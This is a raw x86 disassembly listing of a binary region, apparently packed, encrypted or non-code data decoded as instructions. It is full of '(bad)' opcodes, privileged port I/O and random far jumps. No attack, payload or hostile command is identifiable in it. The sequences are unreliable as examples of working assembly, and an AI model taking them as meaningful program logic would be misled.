  41316d:	fdiv   DWORD PTR [ecx-0x1b6d050a]
  413173:	or     ebx,DWORD PTR [esi-0x2c]
  413176:	es pusha 
  413178:	xchg   ebx,eax
  413179:	loope  0x41318d
  41317b:	pop    ds
  41317c:	ja     0x413108
  41317e:	dec    edi
  41317f:	pop    ds
  413180:	retf   0xd5eb
  413183:	div    edx
  413185:	sub    DWORD PTR [ecx],0xffffffcb
  413188:	nop
  413189:	adc    eax,0x7ace3664
  41318e:	mov    cl,0x52
  413190:	sbb    ah,al
  413192:	inc    edi
  413193:	clc    
  413194:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413195:	and    eax,DWORD PTR [ebp+0x1a65281e]
  41319b:	aad    0x1a
  41319d:	gs push ds
  41319f:	jo     0x413201
  4131a1:	repz scas al,BYTE PTR es:[edi]
  4131a3:	(bad)  
  4131a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4131a6:	xchg   ebx,eax
  4131a7:	arpl   WORD PTR [ecx],cx
  4131a9:	jnp    0x4131bd
  4131ab:	bound  esi,QWORD PTR [edi-0x122f73e7]
  4131b1:	shl    BYTE PTR [edi],cl
  4131b3:	cdq    
  4131b4:	daa    
  4131b5:	test   DWORD PTR [ecx-0x7d934d05],esi
  4131bb:	gs pop ecx
  4131bd:	dec    ebp
  4131be:	pop    edi
  4131bf:	repnz mov ch,0x5d
  4131c2:	sbb    eax,0x96db575e
  4131c7:	dec    ebp
  4131c8:	popa   
  4131c9:	cwde   
  4131ca:	xchg   DWORD PTR [eax-0x58],esi
  4131cd:	dec    edx
  4131ce:	inc    ebx
  4131cf:	popf   
  4131d0:	(bad)  
  4131d1:	adc    al,0x5d
  4131d3:	fs mov esp,0xb2fa12be
  4131d9:	loope  0x4131bd
  4131db:	fcomp  DWORD PTR [ecx+0x24]
  4131de:	mov    cl,0x8c
  4131e0:	cmp    eax,ebp
  4131e2:	jge    0x413252
  4131e4:	stc    
  4131e5:	idiv   DWORD PTR [ecx-0x2f726009]
  4131eb:	dec    esi
  4131ec:	lock cmp BYTE PTR [eax-0x19],ah
  4131f0:	push   esp
  4131f1:	or     al,BYTE PTR [edx+ecx*1-0x22]
  4131f5:	(bad)  
  4131f7:	xchg   edi,eax
  4131f8:	fwait
  4131f9:	dec    eax
  4131fa:	push   cs
  4131fb:	jge    0x413269
  4131fd:	pop    ss
  4131fe:	add    BYTE PTR [edx+0x6c77a14f],0xe7
  413205:	xchg   BYTE PTR [ebx],cl
  413207:	das    
  413208:	addr16 in al,dx
  41320a:	retf   0xab88
  41320d:	stos   BYTE PTR es:[edi],al
  41320e:	adc    eax,0x701c683d
  413213:	inc    ebx
  413214:	nop
  413215:	inc    eax
  413216:	inc    ebp
  413217:	mov    esi,0xfb19eefe
  41321c:	sbb    DWORD PTR [eax-0x5a],0x22fc9852
  413223:	mov    sp,0x63d7
  413227:	adc    bh,cl
  413229:	cld    
  41322a:	mov    esi,0x7c6813b5
  41322f:	rcr    DWORD PTR [ebp+ebp*2-0x5c],cl
  413233:	lds    esi,FWORD PTR [ecx+0x2a5d6ced]
  413239:	loop   0x4131f7
  41323b:	sub    BYTE PTR [eax-0x4f631644],ch
  413241:	mov    BYTE PTR [edi],0xa2
  413244:	or     al,BYTE PTR [edi-0x33]
  413247:	das    
  413248:	xlat   BYTE PTR ds:[ebx]
  413249:	adc    DWORD PTR [eax+0x6c],edi
  41324c:	push   ecx
  41324d:	adc    al,0xc
  41324f:	scas   eax,DWORD PTR es:[edi]
  413250:	sub    edi,edx
  413252:	jg     0x413203
  413254:	sbb    al,0xdb
  413256:	sar    BYTE PTR [esi],cl
  413258:	xchg   ebx,eax
  413259:	pusha  
  41325a:	jae    0x4132a7
  41325c:	pop    ds
  41325d:	outs   dx,DWORD PTR ds:[esi]
  41325e:	mov    esi,0xfd9c605f
  413263:	pop    ecx
  413264:	(bad)  
  413265:	int3   
  413266:	mov    dh,0x78
  413268:	inc    ecx
  413269:	sbb    BYTE PTR [ebx],bl
  41326b:	push   es
  41326c:	xchg   edi,eax
  41326d:	out    0x42,eax
  41326f:	xor    DWORD PTR [edx],esi
  413271:	jle    0x413263
  413273:	jne    0x41325f
  413275:	(bad)  
  413276:	fstp   DWORD PTR [edx-0x2e5c9605]
  41327c:	sbb    esp,DWORD PTR [edx]
  41327e:	test   DWORD PTR [esi+0x58],edx
  413281:	ins    BYTE PTR es:[edi],dx
  413282:	push   edx
  413283:	jne    0x413254
  413285:	ds xchg esi,eax
  413287:	dec    ebp
  413288:	mov    ebx,0x259479e8
  41328d:	inc    ecx
  41328e:	arpl   WORD PTR [ebx],cx
  413290:	fadd   st,st(0)
  413292:	push   es
  413293:	mov    WORD PTR [ecx],es
  413295:	div    bl
  413297:	push   ebx
  413298:	or     bl,BYTE PTR [esi]
  41329a:	in     eax,dx
  41329b:	xor    eax,esi
  41329d:	js     0x4132d8
  41329f:	or     DWORD PTR [edi],edi
  4132a1:	jo     0x41322b
  4132a3:	in     eax,dx
  4132a4:	and    DWORD PTR [ecx-0x4f2a04ef],0x50142519
  4132ae:	or     eax,edx
  4132b0:	stos   DWORD PTR es:[edi],eax
  4132b1:	add    edi,DWORD PTR [esi+0x2610f345]
  4132b7:	sbb    DWORD PTR [eax+0x438cb60],eax
  4132bd:	scas   eax,DWORD PTR es:[edi]
  4132be:	jo     0x4132b3
  4132c0:	dec    edi
  4132c1:	and    ebp,eax
  4132c3:	inc    edi
  4132c4:	retf   
  4132c5:	ins    DWORD PTR es:[edi],dx
  4132c6:	cmp    bl,BYTE PTR [esp+ebx*1-0x6a]
  4132ca:	je     0x413256
  4132cc:	push   0x2c
  4132ce:	mov    edi,0x9cbcdc5d
  4132d3:	inc    ebx
  4132d4:	xchg   esp,eax
  4132d5:	cmp    WORD PTR [ebp-0x2c],cx
  4132d9:	dec    esp
  4132da:	and    al,0xa9
  4132dc:	mov    fs,WORD PTR [edx+eiz*8+0x56]
  4132e0:	mov    ebp,edi
  4132e2:	pushf  
  4132e3:	xor    dl,cl
  4132e5:	stc    
  4132e6:	jnp    0x41328c
  4132e8:	ss push ebx
  4132ea:	mov    ch,0xce
  4132ec:	cli    
  4132ed:	enter  0x5af3,0x6f
  4132f1:	andnps xmm4,XMMWORD PTR fs:[ebp-0x5]
  4132f6:	cwde   
  4132f7:	scas   al,BYTE PTR es:[edi]
  4132f8:	out    dx,al
  4132f9:	xor    al,0x47
  4132fb:	pop    esp
  4132fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4132fd:	sub    ch,BYTE PTR [eax]
  4132ff:	rcr    DWORD PTR [ecx+0xe9155c7],cl
  413305:	rcl    DWORD PTR fs:[esi+0xf5cbfce],1
  41330c:	sub    eax,0x5102dc44
  413311:	shld   esi,ebx,cl
  413314:	push   esi
  413315:	test   BYTE PTR [ebx-0x8b48e79],dh
  41331b:	or     DWORD PTR [ecx],0xffffffe5
  41331e:	or     edx,edi
  413320:	popf   
  413321:	leave  
  413322:	jmp    0x4bdc:0x7fd71afd
  413329:	push   es
  41332a:	in     eax,0xa0
  41332c:	fsubr  st(0),st
  41332e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41332f:	js     0x413380
  413331:	push   ebx
  413332:	dec    edx
  413333:	popa   
  413334:	arpl   WORD PTR [ebp+0x36],sp
  413337:	sbb    BYTE PTR [ecx-0x13],ch
  41333a:	and    DWORD PTR [edi-0x5a],edx
  41333d:	fldcw  WORD PTR [esi+0x56]
  413340:	inc    esi
  413341:	out    0xca,eax
  413343:	sbb    al,al
  413345:	dec    esi
  413346:	scas   al,BYTE PTR es:[edi]
  413347:	push   esp
  413348:	scas   al,BYTE PTR es:[edi]
  413349:	inc    esp
  41334a:	popa   
  41334b:	std    
  41334c:	inc    edx
  41334d:	xor    eax,0x36ccaab6
  413352:	mov    edi,0x472005d
  413357:	cld    
  413358:	test   BYTE PTR [eax],0xf1
  41335b:	mov    edx,DWORD PTR [ebx-0x2d976e45]
  413361:	sbb    al,0xc
  413363:	or     bl,BYTE PTR [edx-0x1c]
  413366:	inc    edi
  413367:	mov    al,bh
  413369:	or     cx,WORD PTR [edx+ebx*4]
  41336d:	icebp  
  41336e:	or     al,0xb
  413370:	call   0x85cd:0x1bede8e
  413377:	sub    BYTE PTR [ebp+0x384e9316],0x92
  41337e:	or     ebp,ecx
  413380:	push   eax
  413381:	mov    edi,0x5286f8f6
  413386:	rcl    DWORD PTR [esi+ebp*1+0xa],1
  41338a:	sub    edx,ebx
  41338c:	fdivr  st(4),st
  41338e:	icebp  
  41338f:	fist   DWORD PTR [edx+0x5f]
  413392:	pop    ebp
  413393:	and    bl,BYTE PTR [edx-0x734a4f84]
  413399:	xor    esi,DWORD PTR [ebp-0x18216039]
  41339f:	scas   eax,DWORD PTR es:[edi]
  4133a0:	jecxz  0x4133a6
  4133a2:	add    BYTE PTR [edi-0x125f70c0],ch
  4133a8:	fdiv   DWORD PTR [edx]
  4133aa:	mov    ds:0xaa8b8b51,eax
  4133af:	inc    ebx
  4133b0:	xchg   esi,eax
  4133b1:	int    0xc5
  4133b3:	xor    eax,0x7b9622d2
  4133b8:	mov    ebp,0xad0b08ce
  4133bd:	mov    eax,ds
  4133bf:	inc    edi
  4133c0:	fcom   DWORD PTR [edx]
  4133c2:	mov    BYTE PTR [ebx+0x42dcf2bc],bh
  4133c8:	mov    edx,0x435d23b3
  4133cd:	sub    DWORD PTR [eax-0x4a807a05],edi
  4133d3:	inc    ebp
  4133d4:	into   
  4133d5:	mov    dl,0xfe
  4133d7:	ror    ecx,0x5
  4133da:	shl    DWORD PTR gs:[edi-0x4ce6aa9d],cl
  4133e1:	les    edx,FWORD PTR [ecx]
  4133e3:	out    0xd0,eax
  4133e5:	push   es
  4133e6:	neg    ebx
  4133e8:	or     eax,0x5c533b53
  4133ed:	sub    eax,0x8f1bf0ff
  4133f2:	fs popa 
  4133f4:	pusha  
  4133f5:	xchg   ebx,eax
  4133f6:	cld    
  4133f7:	cli    
  4133f8:	pop    ds
  4133f9:	dec    esi
  4133fa:	mov    edi,0x57832047
  4133ff:	ficom  WORD PTR [edi+ecx*4]
  413402:	push   ebp
  413403:	inc    eax
  413404:	xor    dh,BYTE PTR [edi-0x60]
  413407:	dec    edi
  413408:	dec    edx
  413409:	jno    0x4133db
  41340b:	push   ebp
  41340c:	xchg   ebp,eax
  41340d:	clc    
  41340e:	push   edi
  41340f:	inc    esp
  413410:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413411:	xchg   edi,eax
  413412:	mul    DWORD PTR [eax]
  413414:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413415:	jb     0x4133d8
  413417:	mov    al,0x98
  413419:	imul   eax,DWORD PTR [ebx-0x62],0x22d71b64
  413420:	inc    ecx
  413421:	and    edi,0xffffff95
  413424:	cmp    eax,0x4c1ef09
  413429:	mov    ah,0x4a
  41342b:	mov    ch,BYTE PTR [ecx-0x28bcf7bf]
  413431:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413432:	mov    ebx,DWORD PTR [esi+edi*1-0x1bdfcb12]
  413439:	push   ecx
  41343a:	dec    edx
  41343b:	push   esp
  41343c:	scas   eax,DWORD PTR es:[edi]
  41343d:	aad    0x6e
  41343f:	cmp    eax,0x3982de
  413444:	iret   
  413445:	neg    BYTE PTR [eax]
  413447:	cwde   
  413448:	dec    ecx
  413449:	das    
  41344a:	adc    DWORD PTR [ebx+edi*2+0x7bd3f649],esp
  413451:	into   
  413452:	pusha  
  413453:	and    BYTE PTR [edx-0x7df5e424],ah
  413459:	sub    dl,ah
  41345b:	ret    
  41345c:	add    al,0xdc
  41345e:	rcl    DWORD PTR [ebx+ebp*1+0x29],0x8c
  413463:	xor    eax,0x1c96804a
  413468:	js     0x413417
  41346a:	add    al,0xe9
  41346c:	push   cs
  41346d:	xchg   edi,eax
  41346e:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  413470:	sub    BYTE PTR [ebx-0x11],ch
  413473:	sbb    dl,BYTE PTR [ebx-0x36]
  413476:	and    cl,BYTE PTR [esi-0x1f9f02d9]
  41347c:	lock outs dx,BYTE PTR ds:[esi]
  41347e:	sub    DWORD PTR [edx-0x2cad648],ebp
  413484:	cld    
  413485:	sbb    DWORD PTR [ecx+0x23cd6082],eax
  41348b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41348c:	sbb    eax,ebp
  41348e:	pop    esi
  41348f:	sti    
  413490:	mov    ebp,0x33c970d6
  413495:	mov    esi,0xee5e64d8
  41349a:	ins    BYTE PTR es:[edi],dx
  41349b:	aam    0x20
  41349d:	ret    0xe154
  4134a0:	ret    0x1636
  4134a3:	inc    esi
  4134a4:	xor    al,0x9f
  4134a6:	retf   0x4711
  4134a9:	mov    ds:0x7c8414cc,eax
  4134ae:	push   edx
  4134af:	outs   dx,BYTE PTR ds:[esi]
  4134b0:	inc    esp
  4134b1:	out    0x7e,al
  4134b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4134b4:	cwde   
  4134b5:	push   ss
  4134b6:	pop    ecx
  4134b7:	adc    BYTE PTR [eax],dl
  4134b9:	(bad)  
  4134ba:	mov    ecx,0x20a31abd
  4134bf:	sub    eax,0xa142fd5e
  4134c4:	addr16 xchg esi,eax
  4134c6:	stc    
  4134c7:	mov    ah,al
  4134c9:	aaa    
  4134ca:	push   DWORD PTR ss:[edi+0x50]
  4134ce:	cmp    BYTE PTR [edx-0x3a89cbcf],bl
  4134d4:	mov    al,ds:0xf08707c4
  4134d9:	jg     0x413490
  4134db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4134dc:	scas   eax,DWORD PTR es:[edi]
  4134dd:	xchg   DWORD PTR [edx+0x27],edi
  4134e0:	jo     0x4134b5
  4134e2:	adc    al,0xdb
  4134e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4134e5:	lea    ecx,[ebx]
  4134e7:	in     al,0x8f
  4134e9:	out    dx,eax
  4134ea:	xchg   ebx,eax
  4134eb:	es mov ebx,0xd11421ed
  4134f1:	pushf  
  4134f2:	daa    
  4134f3:	pop    edi
  4134f4:	xor    bl,BYTE PTR [ebp+0x51766027]
  4134fa:	mov    BYTE PTR [ecx+0x2bb8c4ff],ah
  413500:	lahf   
  413501:	adc    BYTE PTR [eax+edi*8-0x3541c53],dl
  413508:	dec    eax
  413509:	div    BYTE PTR ds:0x1fc84ed2
  41350f:	dec    ebp
  413510:	(bad)  
  413511:	fsubr  st(0),st
  413513:	ds sbb bh,cl
  413516:	imul   edx,esi,0xffffff96
  413519:	addr16 xor al,0x79
  41351c:	sub    al,0x42
  41351e:	mov    al,ds:0x25fb0442
  413523:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413524:	mov    ebp,0x1b0f96f5
  413529:	xchg   ecx,eax
  41352a:	cli    
  41352b:	ret    
  41352c:	jecxz  0x4134e7
  41352e:	ret    
  41352f:	xchg   ebp,eax
  413530:	jnp    0x413506
  413532:	xchg   ebp,eax
  413533:	xor    ah,BYTE PTR [edi+0x4b72359f]
  413539:	call   FWORD PTR [edi+0x3024dc56]
  41353f:	and    esp,DWORD PTR [ebx]
  413541:	fwait
  413542:	inc    ebx
  413543:	hlt    
  413544:	ret    0x2efa
  413547:	xor    eax,0xe79504e9
  41354c:	xlat   BYTE PTR ds:[ebx]
  41354d:	or     al,BYTE PTR [esi+0x2456b7ee]
  413553:	popa   
  413554:	loopne 0x4135d0
  413556:	or     eax,ecx
  413558:	xor    bl,BYTE PTR [ebx]
  41355a:	push   0x9113fc79
  41355f:	inc    edi
  413560:	cmp    DWORD PTR [edi-0x5c00b1fd],0x3ec72a6c
  41356a:	and    DWORD PTR [esi+0x61],ecx
  41356d:	mov    edi,0x964a9846
  413572:	or     esp,DWORD PTR [esi]
  413574:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413575:	jno    0x41355b
  413577:	out    0xc0,eax
  413579:	stos   DWORD PTR es:[edi],eax
  41357a:	mov    es,esi
  41357c:	mov    al,ds:0xbb771df4
  413581:	jmp    0x5284:0xde960fe6
  413588:	ror    BYTE PTR [esi],0x9b
  41358b:	int    0xc6
  41358d:	mov    ah,0x15
  41358f:	or     dh,bh
  413591:	add    al,bh
  413593:	je     0x41359c
  413595:	jbe    0x4135c9
  413597:	mov    ss,WORD PTR [esi+0x3b]
  41359a:	jo     0x413603
  41359c:	retf   
  41359d:	daa    
  41359e:	xor    DWORD PTR [edx+eiz*1+0xe],ecx
  4135a2:	or     esi,ebx
  4135a4:	call   0xef71:0x176f5cf2
  4135ab:	mov    DWORD PTR [eax+0xa],esi
  4135ae:	lods   eax,DWORD PTR ds:[esi]
  4135af:	call   0x1f6:0x6f86fa4e
  4135b6:	loope  0x413557
  4135b8:	inc    edx
  4135b9:	push   esp
  4135ba:	mov    dl,0x1f
  4135bc:	pop    ss
  4135bd:	mov    ecx,0x89a84ad4
  4135c2:	sahf   
  4135c3:	ds pop esi
  4135c5:	xor    esp,eax
  4135c7:	jp     0x4135d0
  4135c9:	pop    edx
  4135ca:	retf   
  4135cb:	shl    BYTE PTR [esp+edi*4],1
  4135ce:	in     eax,dx
  4135cf:	rcl    DWORD PTR [ebx-0x44f8075],0xd9
  4135d6:	or     ah,dh
  4135d8:	mov    ss,WORD PTR [edx+0x54]
  4135db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4135dc:	aaa    
  4135dd:	movups xmm4,xmm1
  4135e0:	gs sbb al,0xcf
  4135e3:	xor    DWORD PTR [edx-0x42],edx
  4135e6:	scas   eax,DWORD PTR es:[edi]
  4135e7:	cld    
  4135e8:	mov    eax,0xed1618da
  4135ed:	div    BYTE PTR [ebp-0x7d17aa2b]
  4135f3:	add    al,BYTE PTR [ebx]
  4135f5:	dec    esi
  4135f6:	mov    WORD PTR [ecx-0x1c],cs
  4135f9:	jge    0x413658
  4135fb:	loop   0x4135f2
  4135fd:	xor    BYTE PTR [ecx+0x65d8c8b9],al
  413603:	sti    
  413604:	cmp    bl,BYTE PTR [ecx-0x2a]
  413607:	mov    eax,0x8569a72f
  41360c:	add    edi,0x328fa205
  413612:	inc    esi
  413613:	inc    esi
  413614:	sub    al,0xe5
  413617:	clc    
  413618:	fcmovnu st,st(0)
  41361a:	mov    ebp,0x7e44621b
  41361f:	jns    0x4135f6
  413621:	xchg   ebp,eax
  413622:	xchg   edx,eax
  413623:	(bad)  
  413624:	push   ebx
  413625:	mov    esp,0x704f914d
  41362a:	mov    BYTE PTR [edx],bl
  41362c:	inc    DWORD PTR [ecx-0x37]
  41362f:	inc    ecx
  413630:	push   eax
  413631:	adc    BYTE PTR [eax+0x1f],cl
  413634:	cmp    eax,0xf779057f
  413639:	daa    
  41363a:	out    dx,eax
  41363b:	mov    eax,ds:0xf76eaaaf
  413640:	gs sub al,0xf0
  413643:	mov    bl,0x37
  413645:	ror    BYTE PTR [ebx],1
  413647:	in     al,dx
  413648:	sahf   
  413649:	push   0x6b937288
  41364e:	cwde   
  41364f:	or     eax,0x1cdaf360
  413654:	stos   DWORD PTR es:[edi],eax
  413655:	cmp    esi,0xfffffff6
  413658:	stc    
  413659:	jmp    0xd586:0x54320a79
  413660:	stc    
  413661:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413662:	in     al,0x5
  413664:	aad    0xb1
  413666:	test   dh,bh
  413668:	dec    esi
  413669:	push   edx
  41366a:	jmp    0x70565c47
  41366f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413670:	div    BYTE PTR [ebp-0x14]
  413673:	mov    bh,0x8d
  413675:	sbb    al,0xc
  413677:	and    al,BYTE PTR [edi]
  413679:	xlat   BYTE PTR ds:[ebx]
  41367a:	xlat   BYTE PTR ds:[ebx]
  41367b:	iret   
  41367c:	ds out dx,al
  41367e:	push   es
  41367f:	pop    edi
  413680:	repnz push edx
  413682:	stos   BYTE PTR es:[edi],al
  413683:	add    esi,DWORD PTR [ecx-0x14]
  413686:	in     al,dx
  413687:	out    dx,eax
  413688:	je     0x413650
  41368a:	hlt    
  41368b:	sahf   
  41368c:	scas   eax,DWORD PTR es:[edi]
  41368d:	stos   BYTE PTR es:[edi],al
  41368e:	jp     0x413644
  413690:	bound  ebp,QWORD PTR [eax+0x226524b4]
  413696:	xor    dh,BYTE PTR [esi+0x45d4fb27]
  41369c:	not    BYTE PTR [ecx+eax*8+0x1d]
  4136a0:	lods   al,BYTE PTR ds:[esi]
  4136a1:	hlt    
  4136a2:	out    0x43,eax
  4136a4:	cdq    
  4136a5:	jnp    0x4136ed
  4136a7:	js     0x4136e3
  4136a9:	push   cs
  4136aa:	outs   dx,DWORD PTR ds:[esi]
  4136ab:	bound  edi,QWORD PTR [esi]
  4136ad:	xor    BYTE PTR [ebp-0x271d5edb],al
  4136b3:	add    al,0xaa
  4136b5:	adc    eax,0xdbb728ea
  4136ba:	(bad)  
  4136bb:	xchg   ebx,eax
  4136bc:	push   ds
  4136bd:	imul   BYTE PTR [edx-0x4f]
  4136c0:	xor    esp,DWORD PTR [esi+0x72]
  4136c3:	mov    ah,0x31
  4136c5:	(bad)  
  4136c6:	mov    bh,0x1d
  4136c8:	retf   
  4136c9:	ret    
  4136ca:	fnsave [eax+edx*8-0x11]
  4136ce:	fcmovbe st,st(4)
  4136d0:	jnp    0x413671
  4136d2:	bound  ecx,QWORD PTR [ecx-0x46]
  4136d5:	xchg   esi,eax
  4136d6:	out    dx,eax
  4136d7:	aad    0xbf
  4136d9:	mov    ah,0x96
  4136db:	jo     0x4136da
  4136dd:	push   edi
  4136de:	and    DWORD PTR [ecx+ebx*2-0x5],0xc4d724e3
  4136e6:	(bad)  
  4136e7:	or     eax,DWORD PTR [ebx+0x6e]
  4136ea:	dec    ebx
  4136eb:	lods   eax,DWORD PTR ds:[esi]
  4136ec:	pop    ss
  4136ed:	icebp  
  4136ee:	fs dec ecx
  4136f0:	jb     0x41371b
  4136f2:	sahf   
  4136f3:	leave  
  4136f4:	or     al,0x1c
  4136f6:	push   ebx
  4136f7:	(bad)  
  4136f8:	in     al,0x91
  4136fa:	(bad)  
  4136fb:	shl    BYTE PTR [edx-0x36],cl
  4136fe:	and    BYTE PTR [ecx+0x7c05f1eb],0x0
  413705:	pop    eax
  413706:	inc    esp
  413707:	lods   eax,DWORD PTR ds:[esi]
  413708:	inc    ebx
  413709:	dec    ecx
  41370a:	adc    DWORD PTR [eax+ecx*1+0x3],0x18
  41370f:	loop   0x41371e
  413711:	jmp    0x8d90:0xf008f041
  413718:	jne    0x413725
  41371a:	xor    ebp,DWORD PTR [edx-0x48658a4d]
  413720:	in     al,0x5c
  413722:	sbb    ch,BYTE PTR [esi-0x17]
  413725:	call   FWORD PTR [eax]
  413727:	mov    esi,0xb4c665a2
  41372c:	push   es
  41372d:	in     al,dx
  41372e:	push   ebx
  41372f:	out    dx,eax
  413730:	or     BYTE PTR ds:0x8fd2f9dc,dh
  413736:	repnz (bad) 
  413738:	test   edi,edi
  41373a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41373b:	gs fsqrt 
  41373e:	fs adc al,0xf3
  413741:	daa    
  413742:	retf   0xca
  413745:	jecxz  0x413762
  413747:	in     eax,0x70
  413749:	mov    bh,0x93
  41374b:	xchg   ebp,eax
  41374c:	lock shl DWORD PTR [eax+0x75],1
  413750:	add    eax,0xd2c67a06
  413755:	cmp    BYTE PTR [ebp+0x23],dl
  413758:	xchg   ebp,eax
  413759:	arpl   si,ax
  41375b:	sahf   
  41375c:	mov    ecx,0x998ffc96
  413761:	int    0x6f
  413763:	sub    ebp,DWORD PTR [esi]
  413765:	int    0x9d
  413767:	mov    eax,ds:0xc30fa537
  41376c:	ja     0x413715
  41376e:	mov    dl,0xd3
  413770:	cmp    DWORD PTR [ecx],ecx
  413772:	sbb    eax,0x4c16ca58
  413777:	inc    edx
  413778:	aam    0x70
  41377a:	fisubr WORD PTR [eax+0x75]
  41377d:	cld    
  41377e:	or     DWORD PTR [ecx-0x46],esp
  413781:	mov    ch,0x2e
  413783:	fadd   DWORD PTR [ecx]
  413785:	in     eax,0x96
  413787:	stc    
  413788:	aam    0xf4
  41378a:	sub    eax,0xa623fd10
  41378f:	adc    bh,BYTE PTR [eax+0x6f]
  413792:	imul   esp,DWORD PTR [eax-0x41d897a],0xfffffff1
  413799:	out    dx,eax
  41379a:	and    eax,DWORD PTR [edi+ebx*1]
  41379d:	shl    BYTE PTR [esi-0x2d9b1155],1
  4137a3:	lahf   
  4137a4:	adc    esi,DWORD PTR [edi]
  4137a6:	push   eax
  4137a7:	mov    edi,0x34fe12fb
  4137ac:	dec    edi
  4137ad:	push   ds
  4137ae:	out    0xe8,al
  4137b0:	shl    DWORD PTR [eax-0x20],1
  4137b3:	fistp  QWORD PTR ds:0xa0fd572b
  4137b9:	ins    DWORD PTR es:[edi],dx
  4137ba:	push   0x9332fe04
  4137bf:	rcl    BYTE PTR [ecx+0x238d408f],0xea
  4137c6:	sub    BYTE PTR [eax+ecx*2+0x7ace9f2b],0x13
  4137ce:	les    edi,FWORD PTR [ecx]
  4137d0:	mov    ds:0xd732a480,eax
  4137d5:	lods   al,BYTE PTR ds:[esi]
  4137d6:	(bad)  
  4137d8:	jg     0x413788
  4137da:	je     0x4137f6
  4137dc:	lahf   
  4137dd:	scas   eax,DWORD PTR es:[edi]
  4137de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4137df:	xor    eax,0xd762f12e
  4137e4:	mov    ds:0x315a7332,eax
  4137e9:	test   eax,0xf3f51cdb
  4137ee:	inc    edi
  4137ef:	pop    eax
  4137f0:	mov    dh,0xb6
  4137f2:	test   eax,0xdd6057a0
  4137f7:	sub    al,0x52
  4137f9:	gs and eax,0x3f91198d
  4137ff:	mov    ds:0x40995b98,eax
  413804:	and    BYTE PTR [ecx],dl
  413806:	cs div ebx
  413809:	(bad)  [edi]
  41380b:	pop    edi
  41380c:	in     eax,dx
  41380d:	call   0xa378a5c6
  413812:	sar    BYTE PTR [edi+0x3c],1
  413815:	inc    edx
  413816:	stc    
  413817:	jmp    0x839623cc
  41381c:	aas    
  41381d:	ds xor ebx,0x4172986c
  413824:	pop    eax
  413825:	xchg   edx,eax
  413826:	loopne 0x413856
  413828:	std    
  413829:	mov    cl,0x32
  41382b:	or     DWORD PTR [edx+0x3e4e4e67],esp
  413831:	xor    DWORD PTR [ecx+0x72],edi
  413834:	stos   DWORD PTR es:[edi],eax
  413835:	(bad)  
  413836:	sub    DWORD PTR [ebp-0x7f8bf8b6],esi
  41383c:	fucomip st,st(4)
  41383e:	inc    ebp
  41383f:	dec    ebx
  413840:	fimul  DWORD PTR [esi+0x6b]
  413843:	sub    edi,eax
  413845:	mov    ds:0xbbd77d4a,al
  41384a:	push   ds
  41384b:	push   es
  41384c:	add    eax,0x6286193e
  413851:	mov    ds:0xee22317c,al
  413856:	adc    eax,0x6cd02d0c
  41385b:	sub    eax,0xb72f3017
  413860:	gs sbb al,0xdc
  413863:	xchg   esi,eax
  413864:	cld    
  413865:	xor    DWORD PTR [edx],ebx
  413867:	cs pop edx
  413869:	inc    eax
  41386a:	outs   dx,BYTE PTR ds:[esi]
  41386b:	dec    esp
  41386c:	or     ecx,DWORD PTR [edi+esi*2]
  41386f:	jle    0x41389c
  413871:	pop    ebp
  413872:	dec    ecx
  413873:	cld    
  413874:	aaa    
  413875:	adc    esi,DWORD PTR [ebx-0x285b2005]
  41387b:	rol    cl,0x9f
  41387e:	test   DWORD PTR [esi+esi*2+0x5376427b],eax
  413885:	test   BYTE PTR ds:0x9039647e,bl
  41388b:	xchg   esp,eax
  41388c:	mov    esp,0x3cee90a7
  413891:	hlt    
  413892:	outs   dx,BYTE PTR ds:[esi]
  413893:	pop    ecx
  413894:	mov    ebp,ebx
  413896:	push   ecx
  413897:	ja     0x4138f9
  413899:	xchg   ebp,eax
  41389a:	jp     0x413894
  41389c:	pop    ss
  41389d:	and    dh,cl
  41389f:	fidivr DWORD PTR [edi+0x2f]
  4138a2:	les    esp,FWORD PTR [edx-0x6b]
  4138a5:	jo     0x4138b4
  4138a7:	add    ch,cl
  4138a9:	fdiv   DWORD PTR [ebp+0x4ac3f03d]
  4138af:	cwde   
  4138b0:	sub    ebp,DWORD PTR [ebp-0x4e]
  4138b3:	ret    
  4138b4:	cld    
  4138b5:	inc    esi
  4138b6:	call   0x556a16a0
  4138bb:	xlat   BYTE PTR ds:[ebx]
  4138bc:	arpl   cx,si
  4138be:	ror    BYTE PTR es:[eax],1
  4138c1:	pop    ss
  4138c2:	sbb    al,0x3a
  4138c4:	jl     0x41388c
  4138c6:	adc    ebx,ebx
  4138c8:	xor    al,BYTE PTR [eax-0x1b]
  4138cb:	mov    ebp,0xcd7491c6
  4138d0:	fidivr DWORD PTR es:[eax+0x6e374d82]
  4138d7:	pop    eax
  4138d8:	inc    ecx
  4138d9:	jo     0x413893
  4138db:	cmp    al,0xa1
  4138dd:	pop    es
  4138de:	je     0x41389a
  4138e0:	pop    esp
  4138e1:	push   es
  4138e2:	pop    edx
  4138e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4138e4:	or     eax,0xa4666a44
  4138e9:	imul   esi,DWORD PTR [eax+ecx*8+0x4f],0xffffff98
  4138ee:	jne    0x4138ff
  4138f0:	aam    0x6b
  4138f2:	mov    ch,0x54
  4138f4:	mov    cs,WORD PTR [ebp-0x49]
  4138f7:	(bad)  
  4138f8:	cdq    
  4138f9:	jle    0x413937
  4138fb:	jmp    0x4138ff
  4138fd:	mov    eax,0x1f3eb4e4
  413902:	aas    
  413903:	inc    dx
  413905:	sub    al,0x84
